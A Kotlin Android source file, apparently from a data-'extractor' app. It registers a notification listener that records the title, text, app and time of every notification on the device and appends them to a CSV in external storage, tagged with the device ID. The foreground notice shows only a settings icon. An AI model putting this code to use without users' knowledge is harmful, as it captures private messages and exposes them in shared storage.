package info.kalagato.com.extractor.readers

import info.kalagato.com.extractor.Util.getDeviceId
import android.service.notification.NotificationListenerService
import android.content.Intent
import info.kalagato.com.extractor.Extractor
import android.app.PendingIntent
import android.os.*
import android.service.notification.StatusBarNotification
import androidx.core.app.NotificationCompat
import info.kalagato.com.extractor.Constant
import info.kalagato.com.extractor.R
import java.io.File
import java.io.FileWriter
import java.lang.Exception
import java.text.SimpleDateFormat
import java.util.*

class NotificationListener : NotificationListenerService() {
    var TAG = "notification-listener"
    private var mServiceLooper: Looper? = null
    private var mServiceHandler: ServiceHandler? = null
    override fun onBind(intent: Intent): IBinder? {
        return super.onBind(intent)
    }

    override fun onCreate() {
        // Start up the thread running the service.  Note that we create a
        // separate thread because the service normally runs in the process's
        // main thread, which we don't want to block.  We also make it
        // background priority so CPU-intensive work will not disrupt our UI.
        val thread = HandlerThread("SMS_ServiceStartArguments", Process.THREAD_PRIORITY_FOREGROUND)
        thread.start()

        // Get the HandlerThread's Looper and use it for our Handler
        mServiceLooper = thread.looper
        mServiceHandler = ServiceHandler(mServiceLooper)
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        val notificationIntent = Intent(applicationContext, Extractor::class.java)
        val pendingIntent = PendingIntent.getActivity(
            applicationContext,
            0, notificationIntent, 0
        )
        val notification = NotificationCompat.Builder(
            applicationContext,
            Constant.CHANNEL_ID
        ) //todo fix hardcoded channel id
            .setSmallIcon(R.drawable.ic_settings)
            .setShowWhen(false)
            .setContentIntent(pendingIntent)
            .build()
        startForeground(1, notification)
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        stopForeground(true)
        super.onDestroy()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        var text = ""
        var title = ""
        // Implement what you want here
        val extras = sbn.notification.extras
        if (extras.getString("android.title") != null) title = extras.getString("android.title")!!
        if (extras.getCharSequence("android.text") != null) text =
            extras.getCharSequence("android.text").toString()
        try {
            // For each start request, send a message to start a job and deliver the
            // start ID so we know which request we're stopping when we finish the job
            val msg = mServiceHandler!!.obtainMessage()
            msg.arg1 = 123456
            // Create a bundle with the data
            val bundle = Bundle()
            bundle.putString(Constant.TITLE, title)
            bundle.putString(Constant.TEXT, text)
            bundle.putString(Constant.PACKAGE_NAME, sbn.packageName)
            bundle.putString(Constant.POST_TIME, "" + sbn.postTime)
            // Set the bundle data to the Message
            msg.data = bundle
            mServiceHandler!!.sendMessage(msg)
        } catch (e: Exception) {
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Implement what you want here
//        Log.d("notification-listener", "Removed : "+ sbn);
//        Log.d(TAG, "id = " + sbn.getId() + "Package Name" + sbn.getPackageName() +
//                "Post time = " + sbn.getPostTime() + "Tag = " + sbn.getTag());
    }

    // Handler to run on a thread to work in background
    private inner class ServiceHandler(looper: Looper?) : Handler(looper!!) {
        override fun handleMessage(msg: Message) {
            val text = msg.data.getString(Constant.TEXT)
            val title = msg.data.getString(Constant.TITLE)
            val packageName = msg.data.getString(Constant.PACKAGE_NAME)
            val postTime = msg.data.getString(Constant.POST_TIME)
            try {
                val folder = File(
                    Environment.getExternalStorageDirectory()
                        .toString() + "/Folder"
                )
                var `var` = false
                if (!folder.exists()) `var` = folder.mkdir()
                val c = Calendar.getInstance().time
                val df = SimpleDateFormat("dd-MMM-yyyy")
                val formattedDate = df.format(c)
                val filename = (folder.toString() + "/" + Constant.NOTIFICATION + "_"
                        + getDeviceId(applicationContext) + "_" + formattedDate + ".csv")
                val fw = FileWriter(filename, true)
                fw.append(packageName)
                fw.append(',')
                fw.append(title)
                fw.append(',')
                fw.append(text)
                fw.append(",")
                fw.append(postTime)
                fw.append(",")
                fw.append('\n')
                fw.flush()
                fw.close()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}